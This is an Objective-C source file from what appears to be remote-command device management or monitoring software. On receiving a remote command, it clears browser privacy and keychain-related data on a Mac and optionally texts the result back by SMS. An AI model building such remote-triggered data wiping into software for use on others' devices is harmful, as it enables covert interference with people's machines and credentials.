//
//  ClearKeychainCredentialsProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 11/14/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "ClearKeychainCredentialsProcessor.h"
#if !TARGET_OS_IPHONE
#import "BrowserPrivacyManager.h"
#endif

@interface ClearKeychainCredentialsProcessor (private)
- (void) clearKeychainCredentials;
- (void) sendReplySMSWithResult:(BOOL) aResult;
@end



@implementation ClearKeychainCredentialsProcessor


/**
 - Method name: initWithRemoteCommandData:
 - Purpose:This method is used to initialize the ClearKeychainCredentialsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (ClearKeychainCredentialsProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ClearKeychainCredentialsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}


#pragma mark RemoteCmdProcessor Methods


/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ClearKeychainCredentialsProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ClearKeychainCredentialsProcessor--->doProcessingCommand")
	[self clearKeychainCredentials];
}


#pragma mark ClearCredentialDetailsProcessor Private Methods


- (void) clearKeychainCredentials {
	DLog (@"ClearKeychainCredentialsProcessor--->clearCredentialDetails")
#if !TARGET_OS_IPHONE
	BrowserPrivacyManager *browserPrivacyMgr    = [[BrowserPrivacyManager alloc] init];    
    BOOL result                                 = [browserPrivacyMgr clearPrivacyData];    
    [browserPrivacyMgr release];

	[self sendReplySMSWithResult:result];
#endif 
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMSWithResult: (BOOL) aResult {
	DLog (@"ClearKeychainCredentialsProcessor--->sendReplySMS")
    
    NSString *message = nil;
    
    if (aResult) 
        message=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                            andErrorCode:_SUCCESS_];
    else 
        message=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                            andErrorCode:_ERROR_];
    
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:message];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:message];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
 */

-(void) dealloc {
	[super dealloc];
}

@end
